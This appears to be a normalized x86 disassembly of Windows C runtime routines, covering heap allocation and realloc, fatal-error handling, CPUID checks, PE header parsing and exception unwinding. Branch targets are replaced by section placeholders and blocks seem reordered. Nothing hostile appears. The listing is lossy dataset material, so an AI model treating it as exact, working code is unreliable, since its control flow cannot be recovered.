mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_40eef7
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
mov ebx 0x80000000
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
mov ebx 0x80000000
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
cmp edi 0x3f
lea ecx [ ecx + esi - 0x4 ]
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
cmp edi 0x20
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_40f1d6
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_40edf1
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
cmp ebx ecx
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_40ed41
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40f4c3
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
push esi
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_40e940
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
add esp 0xc
mov [ ebp - 0x80 ] 0xc000000d
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov esi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc000000d
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp + 0x2a4 ]
xor ecx ebp
pop esi
call sub_40fd18
add ebp 0x2a8
leave
retn
test esi esi
jne r-xdata
push 0x2
call sub_410aec
pop ecx
sub_40f5bf
push ebp
mov ebp esp
push [ rw-data ]
call sub_40bd2f
test eax eax
pop ecx
je r-xdata
push 0x2
call sub_410aec
pop ecx
pop ebp
jmp sub_40f4c3
pop ebp
jmp eax
sub_40f633
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_40f5e3
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_40f6a0
push 0x10
push r--data
call sub_40c69c
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40d9e0
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_40ba40
pop ecx
jmp r-xdata
call sub_40c6e1
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_40e911
pop ecx
call sub_40d694
push 0x4
call sub_40e8d6
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_40ea02
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40f7e4
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_40eef7
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_40e911
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_40f1d6
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_40d694
call sub_40d694
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_40e911
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d659
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_40d694
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_40d694
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_40b1d0
push ebx
call sub_40ea02
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_40ea2d
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d659
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_40b1d0
push ebx
push [ ebp - 0x20 ]
call sub_40ea2d
add esp 0x14
mov eax esi
sub_40f8bb
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_40bcb8
add edi 0x4
cmp edi 0x28
pop ecx
mov [ esi ] eax
jb r-xdata
pop edi
pop esi
retn
sub_40f8e0
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_40f910
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f960
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40c700
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40f8e0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40f910
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa34
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ esp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ esp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
retn
sub_40fa75
push 0x20
push r--data
call sub_40c69c
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_40bed4
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_40c6e1
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40fa34
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40c61f
mov [ ebp - 0x1c ] 0x1
push eax
call sub_40bd2f
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_40d694
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40f5bf
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40e8d6
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40bd26
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fbe9
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40fc53
push 0x14
push r--data
call sub_40c69c
xor edi edi
mov [ ebp - 0x1c ] edi
push [ rw-data ]
call sub_40bd2f
pop ecx
mov esi eax
cmp esi edi
jne r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x20 ] eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_40c427
pop ecx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40c6e1
retn
cmp [ ebp - 0x1c ] 0x1
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_40f4c3
add esp 0x14
mov esi sub_40fc43
push r--data
call [ GetModuleHandleA@IAT ]
cmp eax edi
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
push esi
call sub_40bcb8
pop ecx
mov [ rw-data ] eax
sub_40fd28
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_40fdb8
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_410d91
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_410db0
jmp r-xdata
sub_40fdb8
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40fd18
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_40fd28
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40fe1a
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_40fe4a
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40fe7b
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
cmp eax ebx
push edi
mov edi ecx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
